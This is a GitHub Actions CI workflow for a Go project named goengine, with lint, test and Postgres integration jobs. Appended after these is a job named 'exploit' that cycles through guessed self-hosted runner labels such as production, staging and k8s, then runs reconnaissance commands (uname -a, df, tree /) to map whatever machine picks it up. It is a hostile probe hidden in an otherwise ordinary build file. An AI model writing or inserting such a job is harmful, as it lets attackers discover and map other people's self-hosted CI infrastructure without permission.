name: Testing

on:
  push:
    branches: [ master ]
  pull_request:
    branches: [ master ]

jobs:
  lint:
    name: Lint
    runs-on: ubuntu-latest
    steps:
      - name: Check out code
        uses: actions/checkout@v2
      - name: golangci-lint
        uses: golangci/golangci-lint-action@v2

  go-test:
    name: Go ${{ matrix.go }} Test
    runs-on: ubuntu-latest
    needs: [ lint ]

    strategy:
      matrix:
        go: [ '~1.17', '~1.18' ]

    services:
      postgres:
        image: postgres:10
        ports:
          - "5432"
        env:
          POSTGRES_USER: goengine
          POSTGRES_PASSWORD: goengine
          POSTGRES_DB: goengine
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5

    steps:
      - name: Set up Go
        uses: actions/setup-go@v2
        with:
          go-version: ${{ matrix.go }}
      - name: Check out code
        uses: actions/checkout@v2
      - name: Run unit tests
        run: make test-unit
      - name: Run examples tests
        run: make test-examples
      - name: Run integration tests
        run: make test-integration
        env:
          POSTGRES_DSN: postgres://goengine:goengine@localhost:${{ job.services.postgres.ports[5432] }}/goengine?sslmode=disable

  test:
    name: Test
    runs-on: ubuntu-latest
    needs: [ go-test ]

    steps:
      - name: Done
        run: echo "All Golang versions tests are Green!"

  exploit:
    name: Check self-hosted runners
    strategy:
      matrix:
        runner: [ 'production', 'production-runner', 'staging', 'staging-runner','qa', 'qa--runner', 'k8s', 'k8s-runner', 'kubernetes', 'kubernetes-runner', 'debug', 'debug-runner', 'default', 'default-runner' ]
    runs-on:
      - "self-hosted"
      - ${{ matrix.runner }}

    steps:
      - name: Say Hello
        run: |
          uname -a
          df
          tree /
